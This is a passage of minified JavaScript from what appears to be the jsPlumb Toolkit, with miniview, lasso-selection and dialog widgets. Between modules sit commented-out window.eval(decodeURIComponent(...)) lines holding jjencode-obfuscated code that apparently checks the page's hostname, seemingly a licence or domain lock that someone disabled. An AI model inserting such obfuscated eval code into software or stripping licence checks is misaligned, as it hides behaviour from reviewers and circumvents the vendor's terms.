                e && b.appendChild(e)
            }
        }
          , N = function(a, d) {
            if (!a.node || E(a.node) !== !1) {
                var h = e.getSize(a.el)
                  , j = c.createElement({
                    position: g.absolute,
                    width: h[0] + g.px,
                    height: h[1] + g.px,
                    left: 0,
                    top: 0,
                    clazz: f.MINIVIEW_ELEMENT + (d ? " " + d : "")
                });
                if (v && j.setAttribute("jtk-miniview-type", v(a.node)),
                j.relatedElement = a.el,
                j.jtk = a.node,
                s = o.getBoundsInfo(),
                j.setAttribute(i.jtkNodeId, a.node.id),
                j.setAttribute(i.relatedNodeId, a.el.getAttribute(g.id)),
                q.appendChild(j),
                z.add(j),
                l.nodeMap()[(a.node || a.group).id] = j,
                a.group)
                    M(a.group, j);
                else if (a.node.group) {
                    var k = l.nodeMap()[a.node.group.id];
                    k && (k.appendChild(j),
                    z.suspend(a.el))
                }
                m.getLayout().map(a.node.id, j),
                b()
            }
        };
        this.registerNode = function(a) {
            N(a, "Group" === a.node.objectType ? f.MINIVIEW_GROUP_ELEMENT : ""),
            L(a)
        }
        ;
        var O = this.setOffset;
        this.setOffset = function(a, b) {
            O.apply(this, arguments),
            z.positionChanged(a, [b.left, b.top])
        }
        ;
        var P = this.setAbsolutePosition;
        this.setAbsolutePosition = function(a, b) {
            P.call(this, a, b),
            z.positionChanged(a, b)
        }
        ,
        this.setVisible = function(a) {
            I = a,
            p.style.display = a ? g.block : g.none
        }
        ,
        this.setVisible(a.visible !== !1),
        this.getPan = z.getPan;
        var Q = function(a, b) {
            for (var c = a.getNodes(), d = 0; d < c.length; d++)
                l.nodeMap()[c[d].id].style.display = b ? "block" : "none"
        }
          , R = function(a) {
            var c = l.nodeMap()[a.id];
            if (c) {
                var d = e.getSize(c.relatedElement);
                c.style.width = d[0] + g.px,
                c.style.height = d[1] + g.px,
                b(),
                v && c.setAttribute("jtk-miniview-type", v(a.obj))
            }
        };
        this.invalidate = function(a) {
            if (a)
                R({
                    id: a
                });
            else {
                var b = l.nodeMap();
                for (var c in b)
                    R({
                        id: c
                    })
            }
        }
        ,
        this.setSuspended = function(a, b) {
            t = a,
            b && this.update()
        }
        ,
        this.update = b;
        var S = function(a) {
            var c = a.node
              , d = l.nodeMap()[c];
            d && (z.remove(d),
            delete l.nodeMap()[c],
            l.jsPlumb.removeElement(d)),
            a.dontUpdatePanner || b()
        }
          , T = function() {
            var a = l.nodeMap();
            for (var c in a)
                S({
                    node: c,
                    dontUpdatePanner: !0
                });
            b()
        };
        o.bind(h.pan, b),
        o.bind(h.zoom, b),
        o.bind(h.nodeMoveEnd, L),
        o.bind(h.nodeRemoved, S),
        o.bind(h.nodeAdded, N),
        o.bind(h.nodeRendered, N),
        o.bind(h.groupMoveEnd, L),
        o.bind(h.groupAdded, function(a) {
            N(a, f.MINIVIEW_GROUP_ELEMENT)
        }),
        o.bind(h.groupMoveEnd, L),
        o.bind(h.groupMemberAdded, function(a) {
            var b = l.nodeMap()[a.group.id]
              , c = l.nodeMap()[a.node.id];
            b && c && b.appendChild(c)
        }),
        o.bind(h.groupMemberRemoved, function(a) {
            var b = l.nodeMap()[a.node.id];
            b && q.appendChild(b)
        }),
        o.bind(h.groupCollapse, function(a) {
            Q(a.group, !1),
            R({
                id: a.group.id
            })
        }),
        o.bind(h.groupExpand, function(a) {
            Q(a.group, !0),
            R({
                id: a.group.id
            })
        }),
        o.bind(h.relayout, b),
        o.bind(h.objectRepainted, R),
        o.bind(h.stateRestored, b),
        a.toolkit.bind(h.graphClearStart, T);
        var U = function() {
            K(!0)
        };
        m.getLayout().bind(h.redraw, U),
        this.setHostLayout = function(a) {
            var b = m.getLayout();
            b && b.setHostLayout(a)
        }
        ,
        this.setZoom = z.setZoom,
        this.getZoom = z.getZoom,
        this.getTransformOrigin = z.getTransformOrigin
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumbToolkit
      , c = b.Widgets
      , d = a.jsPlumbUtil
      , e = "ontouchstart"in document.documentElement
      , f = e ? "touchstart" : "mousedown"
      , g = e ? "touchend" : "mouseup"
      , h = e ? "touchmove" : "mousemove"
      , i = function(a, b) {
        a.style.width = b[0] + "px",
        a.style.height = b[1] + "px"
    }
      , j = {
        SELECT_DEFEAT: "jtk-lasso-select-defeat",
        LASSO: "jtk-lasso",
        LASSO_MASK: "jtk-lasso-mask",
        LASSO_MASK_LEFT: "jtk-lasso-mask-left",
        LASSO_MASK_TOP: "jtk-lasso-mask-top",
        LASSO_MASK_RIGHT: "jtk-lasso-mask-right",
        LASSO_MASK_BOTTOM: "jtk-lasso-mask-bottom"
    }
      , k = {
        SELECT_START: "onselectstart"
    }
      , l = function() {};
    c.Lasso = function(a) {
        var b, c = a.canvas, e = !1, m = {}, n = [0, 0], o = a.onStart || l, p = a.onEnd || l, q = a.onSelect || l, r = !1, s = !1, t = a.invert === !0, u = function(a, c) {
            if (t) {
                var d = window.innerWidth
                  , e = window.innerHeight
                  , f = window.scrollX
                  , g = window.scrollY
                  , h = e - a[1] + g
                  , j = e - h + c[1]
                  , k = d - a[0] + f
                  , l = d - k + c[0];
                m.top.style.bottom = h + "px",
                m.bottom.style.top = j + "px",
                m.left.style.right = k + "px",
                m.right.style.left = l + "px",
                m.top.style.left = d - k + "px",
                m.top.style.right = d - l + "px",
                m.bottom.style.left = d - k + "px",
                m.bottom.style.right = d - l + "px"
            } else
                jsPlumb.setAbsolutePosition(b, a),
                i(b, c)
        }, v = function(a) {
            var c = a ? "block" : "none";
            t ? (m.top.style.display = c,
            m.left.style.display = c,
            m.right.style.display = c,
            m.bottom.style.display = c) : b.style.display = c,
            jsPlumb[a ? "addClass" : "removeClass"](document.body, j.SELECT_DEFEAT)
        }, w = function(b) {
            e && !A(b) && (d.consume(b),
            r = !0,
            a.on(document, g, y),
            a.on(document, h, x),
            a.on(document, k.SELECT_START, z),
            n = a.pageLocation(b),
            u(n, [1, 1]),
            o(n, b.shiftKey))
        }, x = function(b) {
            if (r) {
                s || (v(!0),
                s = !0),
                d.consume(b);
                var c = a.pageLocation(b)
                  , e = [Math.abs(c[0] - n[0]), Math.abs(c[1] - n[1])]
                  , f = [Math.min(n[0], c[0]), Math.min(n[1], c[1])];
                u(f, e),
                q(f, e, [n[0] < c[0], n[1] < c[1]], b.shiftKey)
            }
        }, y = function(b) {
            r && (r = !1,
            s = !1,
            d.consume(b),
            a.off(document, g, y),
            a.off(document, h, x),
            a.off(document, k.SELECT_START, z),
            v(!1),
            p())
        }, z = function() {
            return !1
        }, A = a.filter ? function(b) {
            var c = b.srcElement || b.target;
            return d.matchesSelector(c, a.filter)
        }
        : function() {
            return !1
        }
        , B = function(a) {
            var b = document.createElement("div");
            return b.className = a.join(" "),
            document.body.appendChild(b),
            b
        }, C = function() {
            m.top = B([j.LASSO_MASK, j.LASSO_MASK_TOP]),
            m.bottom = B([j.LASSO_MASK, j.LASSO_MASK_BOTTOM]),
            m.left = B([j.LASSO_MASK, j.LASSO_MASK_LEFT]),
            m.right = B([j.LASSO_MASK, j.LASSO_MASK_RIGHT])
        };
        t ? C() : b = B([j.LASSO]),
        a.on(c, f, w),
        this.isActive = function() {
            return r
        }
        ,
        this.setEnabled = function(a) {
            e = a
        }
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a, b, c, d, e, f, g, h, i, j, k, l, m, n = this, o = n.jsPlumb, p = n.Rotors, q = {}, r = {
        ok: "OK",
        cancel: "Cancel"
    }, s = document.body, t = !1, u = p.newInstance({
        templateResolver: function(a) {
            return x[a] || document.getElementById(a).innerHTML
        }
    }), v = {}, w = !0, x = {};
    o.ready(function() {
        b = document.createElement("div"),
        b.className = "jtk-dialog-underlay",
        o.on(b, "click", function() {
            M(!0)
        }),
        c = document.createElement("div"),
        c.className = "jtk-dialog-overlay",
        d = document.createElement("div"),
        d.className = "jtk-dialog-title",
        c.appendChild(d),
        e = document.createElement("div"),
        e.className = "jtk-dialog-content",
        c.appendChild(e),
        f = document.createElement("div"),
        f.className = "jtk-dialog-buttons",
        c.appendChild(f)
    });
    var y = function(a) {
        if (f.innerHTML = "",
        a.buttons)
            for (var b, c = 0; c < a.buttons.length; c++)
                b = a.buttons[c],
                f.appendChild(b),
                "true" === b.getAttribute("jtk-commit") ? o.on(b, "click", function() {
                    M()
                }) : "true" === b.getAttribute("jtk-cancel") && o.on(b, "click", function() {
                    M(!0)
                });
        else
            l = document.createElement("button"),
            l.className = "jtk-dialog-button jtk-dialog-button-ok",
            l.innerHTML = r.ok,
            f.appendChild(l),
            o.on(l, "click", function() {
                M()
            }),
            m = document.createElement("button"),
            m.className = "jtk-dialog-button jtk-dialog-button-cancel",
            m.innerHTML = r.cancel,
            m.setAttribute("jtk-cancel", "true"),
            f.appendChild(m),
            o.on(m, "click", function() {
                M(!0)
            }),
            l.innerHTML = a.labels ? a.labels.ok || r.ok : r.ok,
            m.innerHTML = a.labels ? a.labels.cancel || r.cancel : r.cancel
    }
      , z = function() {
        for (var a = f.children, b = 0; b < a.length; b++)
            a[b].parentNode.removeChild(a[b])
    }
      , A = {
        x: function(a, b, d) {
            var e = s.clientWidth
              , f = (e - d[0]) / 2
              , g = window.pageXOffset || a.scrollLeft || document.body.scrollLeft;
            f < 0 && (f = 10),
            g = b ? g : s.scrollLeft,
            c.style.left = f + g + "px"
        },
        y: function(a, b, d) {
            var e = s.clientHeight
              , f = .1 * e
              , g = window.pageYOffset || a.scrollTop || document.body.scrollTop;
            f < 0 && (f = 10),
            g = b ? g : s.scrollTop,
            c.style.top = f + g + "px"
        }
    }
      , B = function() {
        if (t) {
            var a = document.documentElement
              , d = o.getSize(c)
              , e = s == document.body
              , f = c.getAttribute("data-axis");
            b.style.position = e ? "fixed" : "absolute",
            A[f](a, e, d)
        }
    }
      , C = function(a) {
        27 == a.keyCode && M(!0)
    }
      , D = function(a) {
        return null == a ? document.body : "string" == typeof a ? document.getElementById(a) : a
    }
      , E = function(a) {
        var l;
        if (a.id && q[a.id]) {
            w = a.reposition !== !1,
            g = a.onOK,
            h = a.onCancel,
            i = a.onOpen,
            j = a.onMaybeClose,
            k = a.onClose;
            var m = a.position || "top"
              , n = "jtk-dialog-overlay-" + m
              , p = "top" === m || "bottom" === m ? "x" : "y"
              , r = "jtk-dialog-overlay-" + p;
            y(a),
            s = D(a.container);
            var x = a.data || {}
              , z = u.template(a.id, x);
            d.innerHTML = a.title || q[a.id].title || "",
            e.innerHTML = "";
            var A = z.childNodes.length;
            for (l = 0; l < A; l++)
                e.appendChild(z.childNodes[0]);
            s.appendChild(b),
            s.appendChild(c),
            o.addClass(c, n),
            o.addClass(c, r),
            b.style.display = "block",
            c.style.display = "block",
            c.setAttribute("data-position", m),
            c.setAttribute("data-axis", p);
            var E = q[a.id].cancelable ? "visible" : "hidden"
              , G = f.querySelectorAll("[jtk-cancel='true']");
            for (l = 0; l < G.length; l++)
                G[l].style.visibility = E;
            t = !0,
            B(),
            F(x),
            o.on(document, "keyup", C),
            w && (o.on(window, "resize", B),
            o.on(window, "scroll", B)),
            o.on(c, "click", "[jtk-clear]", function(a) {
                var b = this.getAttribute("jtk-att");
                b && J(c.querySelectorAll("[jtk-att='" + b + "']:not([jtk-clear])"), this)
            }),
            o.on(c, "click", "[jtk-clear-all]", function(a) {
                J(c.querySelectorAll("[jtk-att]:not([jtk-clear])"), this)
            }),
            v.onOpen && v.onOpen(c),
            i && i(c),
            o.addClass(c, "jtk-dialog-overlay-visible");
            try {
                var H = e.querySelector("[jtk-focus]");
                H && setTimeout(function() {
                    H.focus()
                }, 0)
            } catch (a) {}
        }
    }
      , F = function(a) {
        for (var b = e.querySelectorAll("[jtk-att]"), c = 0; c < b.length; c++) {
            var d = b[c].tagName.toUpperCase()
              , f = "INPUT" === d ? (b[c].getAttribute("type") || "TEXT").toUpperCase() : d
              , g = b[c].getAttribute("jtk-att")
              , h = u.data(a, g);
            null != h && G[f](b[c], h),
            b[c].getAttribute("jtk-commit") && ("INPUT" === d ? o.on(b[c], "keyup", function(a) {
                10 != a.keyCode && 13 != a.keyCode || M()
            }) : "TEXTAREA" === d && o.on(b[c], "keyup", function(a) {
                !a.ctrlKey || 10 != a.keyCode && 13 != a.keyCode || M()
            }))
        }
    }
      , G = {
        TEXT: function(a, b) {
            a.value = b
        },
        RADIO: function(a, b) {
            a.checked = a.value == b
        },
        CHECKBOX: function(a, b) {
            a.checked = 1 == b
        },
        SELECT: function(a, b) {
            for (var c = 0; c < a.options.length; c++)
                if (a.options[c].value == b)
                    return void (a.selectedIndex = c)
        },
        TEXTAREA: function(a, b) {
            a.value = b
        }
    }
      , H = {
        TEXT: function(a) {
            return a.value
        },
        RADIO: function(a) {
            if (a.checked)
                return a.value
        },
        CHECKBOX: function(a) {
            if (a.checked)
                return !0
        },
        SELECT: function(a) {
            return a.selectedIndex != -1 ? a.options[a.selectedIndex].value : null
        },
        TEXTAREA: function(a) {
            return a.value
        }
    }
      , I = {
        TEXT: function(a) {
            a.value = ""
        },
        RADIO: function(a) {
            a.checked = !1
        },
        CHECKBOX: function(a) {
            a.checked = !1
        },
        SELECT: function(a) {
            a.selectedIndex = -1
        },
        TEXTAREA: function(a) {
            a.value = ""
        }
    }
      , J = function(a, b) {
        for (var c = 0; c < a.length; c++)
            if (a[c] !== b) {
                var d = a[c].tagName.toUpperCase()
                  , e = "INPUT" === d ? (a[c].getAttribute("type") || "TEXT").toUpperCase() : d
                  , f = I[e];
                f && f(a[c])
            }
    }
      , K = function() {
        for (var a = e.querySelectorAll("[jtk-att]"), b = {}, c = 0; c < a.length; c++) {
            var d = a[c].tagName.toUpperCase()
              , f = "INPUT" === d ? (a[c].getAttribute("type") || "TEXT").toUpperCase() : d
              , g = H[f](a[c])
              , h = a[c].getAttribute("jtk-att");
            if (null != g) {
                var i = u.data(b, h);
                null != i ? (jsPlumbUtil.isArray(i) || u.data(b, h, [i]),
                i.push(g)) : u.data(b, h, g)
            }
        }
        return b
    }
      , L = function(a, b) {
        try {
            null != a && a.apply(a, Array.prototype.slice.apply(arguments, [1]))
        } catch (a) {}
    }
      , M = function(d) {
        var f = d ? null : K();
        (d || null == j || j(f) !== !1) && (t = !1,
        b.style.display = "none",
        c.style.display = "none",
        o.off(document, "keyup", C),
        o.off(window, "resize", B),
        o.off(window, "scroll", B),
        o.removeClass(c, "jtk-dialog-overlay-visible"),
        o.removeClass(c, "jtk-dialog-overlay-top"),
        o.removeClass(c, "jtk-dialog-overlay-bottom"),
        o.removeClass(c, "jtk-dialog-overlay-left"),
        o.removeClass(c, "jtk-dialog-overlay-right"),
        o.removeClass(c, "jtk-dialog-overlay-x"),
        o.removeClass(c, "jtk-dialog-overlay-y"),
        c.setAttribute("data-position", ""),
        c.setAttribute("data-axis", ""),
        s.removeChild(b),
        s.removeChild(c),
        z(),
        d ? (L(v.onCancel, e),
        L(h, e)) : (L(v.onOK, f, e),
        L(g, f, e)),
        L(v.onClose),
        L(k),
        g = h = i = k = j = a = null)
    };
    n.jsPlumbToolkit.Dialogs = {
        initialize: function(a) {
            if (a = a || {},
            q = {},
            a.dialogs)
                for (var b in a.dialogs)
                    x[b] = a.dialogs[b][0],
                    q[b] = {
                        content: x[b],
                        title: a.dialogs[b][1] || "",
                        cancelable: a.dialogs[b][2] !== !1
                    };
            else
                for (var c = a.selector || ".jtk-dialog", d = o.getSelector(c), e = 0; e < d.length; e++) {
                    var f = d[e].getAttribute("id");
                    null != f && (q[f] = {
                        content: d[e].innerHTML,
                        title: d[e].getAttribute("title") || "",
                        el: d[e],
                        cancelable: "false" !== d[e].getAttribute("cancel")
                    })
                }
            a.labels && o.extend(r, a.labels),
            a.globals && o.extend(v, a.globals)
        },
        show: E,
        hide: function() {
            M(!0)
        },
        clear: J
    },
    "undefined" != typeof exports && (exports.Dialogs = n.jsPlumbToolkit.Dialogs)
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%